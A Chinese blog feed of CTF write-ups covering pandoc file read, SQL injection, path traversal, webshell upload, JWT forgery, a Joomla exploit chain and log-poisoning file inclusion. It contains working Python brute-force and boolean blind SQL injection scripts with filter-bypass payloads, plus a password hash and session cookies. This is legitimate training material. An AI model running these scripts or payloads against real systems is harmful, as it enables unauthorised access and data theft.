user_info_json + SALT + key_iv_json<br>        n_val = hashlib.md5( n_source.encode() ).hexdigest()<br><br>        # 组装 Payload (q 是固定的)<br>        final_payload = &#123;<br>            &quot;p&quot; : p_val ,<br>            &quot;q&quot; : CAPTURED_Q ,<br>            &quot;n&quot; : n_val<br>        &#125;<br>        final_b64 = base64.b64encode( json.dumps( final_payload , separators=(&#x27;,&#x27; , &#x27;:&#x27;) ).encode() ).decode()<br>        #print(&quot;pwd:&quot;+pwd)<br>        # 发包<br>        try :<br>            # 必须带上正确的 Header，否则可能触发 500<br>            headers = &#123;<br>                &quot;Content-Type&quot; : &quot;text/plain&quot; ,<br>                &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36&quot; ,<br>                &quot;Referer&quot; : &quot;http://114.66.24.228:33336/&quot;<br>            &#125;<br>            resp = requests.post( TARGET_URL , data=final_b64 , headers=headers )<br>            #print(resp.text)<br>            body=resp.text<br>            # 结果分析<br>            if int(resp.headers.get(&#x27;Content-Length&#x27;)) &gt;=100 :<br>                print( f&quot;\n\n&#123;&#x27;=&#x27; * 50&#125;\n[SUCCESS] 密码正确: &#123;pwd&#125;\n[RESULT]: &#123;body&#125;\n&#123;&#x27;=&#x27; * 50&#125;&quot; )<br>                break<br><br>        except Exception as e :<br>            pass<br><br><br>if __name__ == &quot;__main__&quot; :<br>    solve()<br></code></pre></td></tr></table></figure><h2 id="Markdown2world"><a href="#Markdown2world" class="headerlink" title="Markdown2world"></a>Markdown2world</h2><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844658929-dd26e47f-9ba0-4501-ad7b-9af07f51611f.png">访问之后是一个文档转换器，然后问了ai之后，一开始让转换成html试试能不能任意文件读取，发现不行。然后又试试可不可以参数注入，也不行，然后Gemini继续说到pandoc有一个特性</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844705243-b42b80c1-dd3f-4e3e-912b-c20249747357.png"></p><p>试了一下之后发现可行，在word/media下有一个.so文件</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844777186-589af012-72be-4582-82c3-f3216fb7b139.png"></p><p>打开之后发现里面正是/etc/passwd的内容，那就只要猜一下flag的目录即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">![f1](/flag)<br>![f2](/flag.txt)<br>![f3](/app/flag)<br>![f4](/home/ctf/flag)<br></code></pre></td></tr></table></figure><p>再次提交之后也是成功得到flag</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844836056-9feb4eb5-c5da-471c-b0ce-fc4f271f12a9.png"></p><h1 id="破阵阁训练赛"><a href="#破阵阁训练赛" class="headerlink" title="破阵阁训练赛"></a>破阵阁训练赛</h1><p>这个比赛挺适合新手的，就是刚开始的时候容器打不开，比赛还只有3小时</p><h2 id="最简单的Web安全入门"><a href="#最简单的Web安全入门" class="headerlink" title="最简单的Web安全入门"></a>最简单的Web安全入门</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841206414-d05748b9-d028-4412-9884-f97eee2ba79c.png"><br>id加引号有报错，直接sqlmap一把梭</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841233836-20a47719-64fb-4535-bc28-d76816db4a76.png"></p><h2 id="安全牛的ERP"><a href="#安全牛的ERP" class="headerlink" title="安全牛的ERP"></a>安全牛的ERP</h2><p>访问之后是登录页面，试了常见的弱口令无果，然后来扫路径</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769846559506-c5e6f500-bbde-499a-ae98-4093a7d31b31.png"></p><p>发现一个api文档页面，测试了一下好像没啥用，没办法注册新用户，应该还是要往路径绕过这方面去想，在Gemini的多个测试payload下成功绕过</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847906288-11125c06-56ea-4ff2-a1dd-8277cd79cdf9.png"></p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847915924-26b4b155-50e1-4b03-954c-53d019b3b370.png"></p><p>其实一开始就测试了../，但是可能是直接在浏览器输入的原因，没有绕过，现在在yakit试了一下直接成功了</p><h2 id="激进的开发者"><a href="#激进的开发者" class="headerlink" title="激进的开发者"></a>激进的开发者</h2><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848119716-e9080ad4-3cea-4be4-af56-062b1c772ef3.png"></p><p>根据这个描述，先扫一波目录试试</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848180960-8eef4365-9d0e-4c2b-9b41-e079ebe0eeb8.png"></p><p>config.php无内容，可能需要参数，但是目前还不知道，先注册账号试试</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848401993-0f95f738-b655-44eb-86f4-c38efd7b1ccf.png"></p><p>登录上之后疑似有注入点，sqlmap嗦一把看看</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848437974-6b7ef6e3-059f-4a10-abdc-6af1613ba233.png"></p><p>登上去之后有个文件上传点，可以直接上传webshell</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848545719-d66e966e-b715-4c70-b404-cb62ba8730bd.png"></p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848656221-ae336453-f922-451f-818a-88a3ac295e3a.png"></p><p>看来一句话木马不行了，要上蚁剑才行，好吧，是我想多了，flag在/home/www-data目录下</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848924811-8f304c95-455b-4ccb-a52a-345f78122079.png"></p><h2 id="贼牛掰的身份鉴权，还怕在失陷？"><a href="#贼牛掰的身份鉴权，还怕在失陷？" class="headerlink" title="贼牛掰的身份鉴权，还怕在失陷？"></a>贼牛掰的身份鉴权，还怕在失陷？</h2><p>访问之后是登录，登录失败会给一个普通用户的账号，登录之后抓包能看到token，结合题目描述，应该是jwt伪造</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850131488-8ced480b-63e3-4be0-8aef-088b93530a39.png"></p><p>然后拿去伪造一个admin的token<!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850196592-33f7ebf0-21c8-4d9a-b810-353a1b705966.png"></p><p>然后拿到flag</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850209454-4a5159fb-258b-4e5a-bf1d-0e571222b90b.png"></p><h2 id="小小的挑战"><a href="#小小的挑战" class="headerlink" title="小小的挑战"></a>小小的挑战</h2><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769855572576-9f9bd0d0-24e9-4f34-98d1-b58a20d575e6.png"></p><p>在路径中的htaccess.txt中可以看到这是joomla</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858438407-178802ab-f8ab-44ce-a080-02b6ef913f86.png"></p><p>其实熟悉的人看到这些路径应该就能猜出来这是joomla</p><p>然后可以用<code>/administrator/manifests/files/joomla.xml</code>路径判断joomla的具体版本</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858495744-a71ce08c-83d7-4f21-8893-c9524e0a823a.png"></p><p>有了具体版本就好办了，直接搜该版本对应的exp就行</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858586168-0cd0a1df-6d0b-47af-9c0d-0a8f76e56e19.png"></p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859013476-53b2a2c5-430d-4deb-a0fa-9240e2caed38.png"></p><p>在这个文件中给了具体点，sqlmap命令都给了，直接照着运行即可，但是到后面爆数据的时候遇到问题了，这个里面的表全是<code>#__</code>开头，这导致sqlmap不太好跑，我这里用Gemini给的payload手工编码之后再注入</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858894156-7e1502bd-ff7e-4559-b88a-5bb32e50dfbc.png"></p><p>得到hash，然后kali爆破一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">2y$10<span class="hljs-variable">$1XJmZJy0fG3u6LaYOj3n5eB8j6gocddi1c4rieSQ1VbgxTxWBGtGa</span></span><br></code></pre></td></tr></table></figure><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859037802-a90d3400-494a-4616-ac40-84ef4dcb023f.png"></p><p>然后去<code>/administrator/index.php</code>登录管理员后台，然后在template处添加模板<!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859737024-ed57835e-41f5-4673-bd10-9b313a6875cf.png"></p><p>然后读取flag即可</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859754293-955db0ef-b3f2-4c13-aff4-a3335e5b6f4c.png"></p><h2 id="遗忘的调试信息"><a href="#遗忘的调试信息" class="headerlink" title="遗忘的调试信息"></a>遗忘的调试信息</h2><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859903435-264e9da1-4bee-492d-8c26-557aa6615712.png"></p><p>根据介绍，还是扫一下目录</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859920511-f91cc6dd-7847-436d-b62a-c9aada80ae13.png"></p><p>这题得多找字典扫</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769861343030-30efcd5d-8120-4f54-a1eb-a49c15035fbc.png"></p><p>然后在这个目录下一个个翻，找到有一个info.php有一个文件包含的功能</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862209244-81f5d610-6b21-4904-b64e-f380df83903d.png"></p><p>现在有2个思路，一个是根据推测，flag文件应该是在<code>/home/www-data/flag</code>，读取即可，还有一个就是往日志中写入一句话木马，然后用这个info.php来包含</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862741529-f6f5e882-4abe-4c94-b584-69aaf7d5d99e.png"></p><p>然后就是可以在一句话木马里面，在命令执行的前后输出一点特殊符号，不然找起来很麻烦</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862801919-07004bf2-5bd0-40f6-b0c9-7a35a30055de.png"></p><h2 id="有点限制，但不多"><a href="#有点限制，但不多" class="headerlink" title="有点限制，但不多"></a>有点限制，但不多</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862913197-94463a70-22cc-49e5-941f-b45cf69f5cd1.png"><br>根据题目描述，应该是要绕过什么</p><p>扫目录扫出这些</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769865188999-c6c89441-8ff5-44e5-8ea9-c823644d4bbd.png"></p><p>然后我们注册账号，注册账号的时候要邮箱和其他display name要稍微长一点，不然登录不成功，当用同样的信息注册的时候提示邮箱已被使用就是成功了，然后登录提示账号未激活，要6位激活码，而正好激活页面需要userid和激活码</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866409383-8c177ec7-27c7-492c-90c3-09998d32124f.png"></p><p>而userid可以在主页测出来</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866461281-8fa34082-a7d0-46dc-8e5d-f222217d5932.png"></p><p>那就是爆破激活码了，然后要注意的点是本次响应包中的token要作为下次爆破时参数里的token，爆破脚本如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import re<br>from tqdm import tqdm<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= 配置区 =================</span><br>BASE_URL = &quot;http://175.27.169.122:56858&quot;<br>ACTIVATE_URL = f&quot;&#123;BASE_URL&#125;/activate.php&quot;<br>USER_ID = &quot;14&quot;  # 你的用户ID<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">填入你当前的 Cookie</span><br>COOKIES = &#123;<br>    &quot;joomla_user_state&quot; : &quot;logged_in&quot; ,<br>    &quot;joomla_remember_me_30166589d367bfdbe43cc3254602628c&quot; : &quot;uz80UeRF5loDQe4f.VvBTLOKTKl765S7znfCc&quot; ,<br>    &quot;460ada11b31d3c5e5ca6e58fd5d3de27&quot; : &quot;590c2000212f07d77f838c8d19d7bff7&quot; ,<br>    &quot;6f12c8b01052b36ca2996b535ee18e8d&quot; : &quot;d75f5e0706132dc3e9a4a675691a3c3e&quot; ,<br>    &quot;PHPSESSID&quot; : &quot;f5fd35f4fde42898ee1c56e97507a403&quot; ,<br>    &quot;user&quot; : &quot;test&quot; ,<br>    &quot;pass&quot; : &quot;7110eda4d09e062aa5e4a390b0a572ac0d2c0220&quot;<br>&#125;<br><br>HEADERS = &#123;<br>    &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36&quot; ,<br>    &quot;Referer&quot; : ACTIVATE_URL ,<br>    &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==========================================</span><br><br>def get_token(html) :<br>    &quot;&quot;&quot;使用正则从 HTML 中提取隐藏的 token&quot;&quot;&quot;<br>    # 匹配 &lt;input type=&#x27;hidden&#x27; name=&#x27;token&#x27; value=&#x27;...&#x27;&gt;<br>    match = re.search( r&quot;name=&#x27;token&#x27; value=&#x27;(.*?)&#x27;&quot; , html )<br>    if match :<br>        return match.group( 1 )<br>    return None<br><br><br>def solve() :<br>    session = requests.Session()<br>    # 将预设的 Cookie 加入 Session<br>    for k , v in COOKIES.items() :<br>        session.cookies.set( k , v )<br><br>    # 1. 访问页面获取初始 Token<br>    print( &quot;[*] 正在获取初始 Token...&quot; )<br>    res = session.get( ACTIVATE_URL , headers=HEADERS )<br>    current_token = get_token( res.text )<br><br>    if not current_token :<br>        print( &quot;[-] 无法获取初始 Token，请检查网络或 Cookie&quot; )<br>        return<br><br>    print( f&quot;[+] 初始 Token: &#123;current_token&#125;&quot; )<br><br>    # 2. 开始爆破 000000 - 999999<br>    # 你可以根据需要调整范围<br>    for i in tqdm( range( 1000000 ) , desc=&quot;Brute Forcing&quot; ) :<br>        code = str( i ).zfill( 6 )  # 格式化为 6 位数字，如 000123<br><br>        data = &#123;<br>            &quot;userid&quot; : USER_ID ,<br>            &quot;activation_code&quot; : code ,<br>            &quot;token&quot; : current_token<br>        &#125;<br><br>        try :<br>            # 发送 POST 请求<br>            resp = session.post( ACTIVATE_URL , data=data , headers=HEADERS )<br><br>            # 3. 结果判断<br>            # 如果激活成功，通常页面会跳转，或者不包含 &quot;failed&quot; 关键字<br>            # 你需要根据实际成功的返回特征修改这里的判断逻辑<br>            if resp.status_code!=403 :<br>                print( f&quot;\n\n[SUCCESS] 爆破成功！&quot; )<br>                print( f&quot;[*] 激活码: &#123;code&#125;&quot; )<br>                print( f&quot;[*] 响应内容: &#123;resp.text&#125;&quot; )  # 打印前200字符<br>                break<br><br>            # 4. 【关键】获取下一个包所需的 Token<br>            # 服务器在响应体中会给出下一次操作的隐藏 token<br>            current_token = get_token( resp.text )<br><br>            if not current_token :<br>                # 如果没拿到 token，可能是请求太快被封了或者 Session 失效<br>                tqdm.write( f&quot;[!] 警告：在尝试 &#123;code&#125; 时未获取到新 Token，正在重新获取...&quot; )<br>                res = session.get( ACTIVATE_URL , headers=HEADERS )<br>                current_token = get_token( res.text )<br><br>        except Exception as e :<br>            tqdm.write( f&quot;[!] 网络错误: &#123;e&#125;&quot; )<br>            continue<br><br><br>if __name__ == &quot;__main__&quot; :<br>    solve()<br></code></pre></td></tr></table></figure><p>然后在管理员主页源码中可以看到hash，是sha-1，拿去解密即可</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769870918548-bff17011-a740-4101-853e-af6f25e867db.png"></p><p>解密登上管理员账号有一个执行命令的入口，这个入口就是blacklist.txt的限制点</p><p>然后根据如此绕过即可，因为我没解密出密码来，就没办法去试了，但是思路应该是这样的</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769871159794-2a2f7499-624f-405f-8254-88268680907e.png"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java学习笔记5-TransformedMap</title>
    <link href="/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-TransformedMap/"/>
    <url>/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-TransformedMap/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bugku-sql注入 wp</title>
    <link href="/bugku-sql%E6%B3%A8%E5%85%A5-wp/"/>
    <url>/bugku-sql%E6%B3%A8%E5%85%A5-wp/</url>
    
    <content type="html"><![CDATA[<p>参考wp：<a href="https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#RI7de">https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#RI7de</a></p><p><a href="https://blog.csdn.net/cai_huaer/article/details/151112526?spm=1001.2014.3001.5502">https://blog.csdn.net/cai_huaer/article/details/151112526?spm=1001.2014.3001.5502</a></p><p>这2个写的都很好，很惭愧，每次遇到难题都没想过自己去琢磨，而是在常规手段出不来后就去看wp</p><h1 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h1><p>根据csdn那个wp，他的布尔盲住思路很新奇，非常值得学习</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">username=aaa&#x27;-(ascii(substr(database()from(1)))-98)-&#x27;&amp;password=admin<br></code></pre></td></tr></table></figure><p>大意就是sql会把字符隐式转换为数字然后去做加减<code>username=a&#39;-0-&#39;</code>，在数据库中就是<code>select username from xxx where username=&#39;a&#39;-0-&#39;&#39;</code>，’a’会变为0-0=0，后面的’’也看为0，得到的结果为0，会匹配任何以数字0开头的用户名，如果中间换成1，结果就是-1，匹配不到数据。然后根据这一点来写脚本爆破。因为这个题目过滤了很多字符，所以脚本要稍微注意一点。</p><p>该脚本产自Gemini3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import string<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置目标 URL</span><br>url = &quot;http://171.80.2.169:11490/index.php&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">题目要求的 HTTP 头</span><br>headers = &#123;<br>    &quot;Host&quot;: &quot;171.80.2.169:11490&quot;,<br>    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot;,<br>    &quot;Origin&quot;: &quot;http://171.80.2.169:11490&quot;,<br>    &quot;Referer&quot;: &quot;http://171.80.2.169:11490/&quot;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">字典</span><br>chars = string.ascii_lowercase + string.digits + &quot;_-@.&quot;<br><br>print(&quot;[-] 开始爆破数据库名 (长度: 8)...&quot;)<br>print(&quot;[-] 绕过策略: 无空格(用括号)，无逗号(用FROM)，无FOR(利用ASCII特性)&quot;)<br><br>db_name = &quot;&quot;<br><br>for i in range(1, 9):<br>    found_char = False<br>    for char in chars:<br>        char_ascii = ord(char)<br>        <br>        # 核心 Payload:<br>        # 1. 用 FROM(i) 代替 FROM i (绕过空格)<br>        # 2. 去掉 FOR 1 (利用 ASCII 只取首字符特性，绕过 FOR)<br>        # 3. 整体无空格，无逗号<br>        <br>        # 构造 SQL 片段: ascii(substr(database()from(i)))-char_ascii<br>        injection = f&quot;ascii(substr(database()from(&#123;i&#125;)))-&#123;char_ascii&#125;&quot;<br>        <br>        # 拼凑 POST body<br>        data_payload = f&quot;username=aaa&#x27;-(&#123;injection&#125;)-&#x27;&amp;password=admin&quot;<br>        <br>        try:<br>            # data 参数传字符串，避免 requests 自动处理造成干扰<br>            res = requests.post(url, headers=headers, data=data_payload, timeout=5)<br>            <br>            # 这里的判断逻辑是：<br>            # 如果猜对了 -&gt; injection 结果为 0 -&gt; username=aaa&#x27;-0-&#x27; -&gt; 真 -&gt; passwd error<br>            # 如果猜错了 -&gt; injection 结果为 非0 -&gt; username=aaa&#x27;-非0-&#x27; -&gt; 假 -&gt; username dont exist<br>            if &quot;password error&quot; in res.text:<br>                db_name += char<br>                print(f&quot;[+] Found char &#123;i&#125;: &#123;char&#125; -&gt; Current DB: &#123;db_name&#125;&quot;)<br>                found_char = True<br>                break<br>                <br>        except Exception as e:<br>            print(f&quot;[!] Error: &#123;e&#125;&quot;)<br><br>    if not found_char:<br>        print(f&quot;[!] 第 &#123;i&#125; 位字符未找到，可能使用了特殊字符或 Payload 被拦截。&quot;)<br>        db_name += &quot;?&quot;<br><br>print(f&quot;\n[success] 最终数据库名: &#123;db_name&#125;&quot;)<br></code></pre></td></tr></table></figure><p> 然后爆破表和列名都只能用字典去爆破了：</p><p>语句是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">爆破表名</span><br>username=aaa&#x27;or(select(1)from(blindsql.flag))#&amp;password=admin<br><span class="hljs-meta prompt_">#</span><span class="language-bash">爆破列名</span><br>username=aaa&#x27;or(select(password)from(admin))#&amp;password=admin<br></code></pre></td></tr></table></figure><h1 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h1><p>一开始直接让ai写脚本，但是死活出问题，后面给他参考了别人的才写出来。原理还是<code>username=a&#39;or真</code>返回password error，若or后面的条件为false，就返回dont exist</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import string<br>import sys<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">--- 配置区域 ---</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用你之前题目给出的 URL</span><br>url = &quot;http://171.80.2.169:15666/index.php&quot;<br>headers = &#123;<br>    &quot;Host&quot; : &quot;171.80.2.169:15666&quot; ,<br>    &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot; ,<br>    &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 